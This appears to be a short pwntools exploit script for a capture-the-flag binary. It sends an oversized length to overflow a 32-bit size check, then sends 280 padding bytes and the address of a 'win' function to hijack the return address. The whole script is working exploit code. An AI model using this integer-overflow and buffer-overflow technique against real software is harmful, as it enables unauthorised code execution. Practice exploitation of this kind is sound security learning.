max_32_bit = 0x7FFFFFFF
max_64_bit = 0x7FFFFFFFFFFFFFFF

io = start()
io.sendlineafter(b'Size: ', str(max_32_bit + 0x1).encode())
io.sendlineafter(b'Data: ', b'A' * 280 + p64(exe.sym.win))
io.interactive()

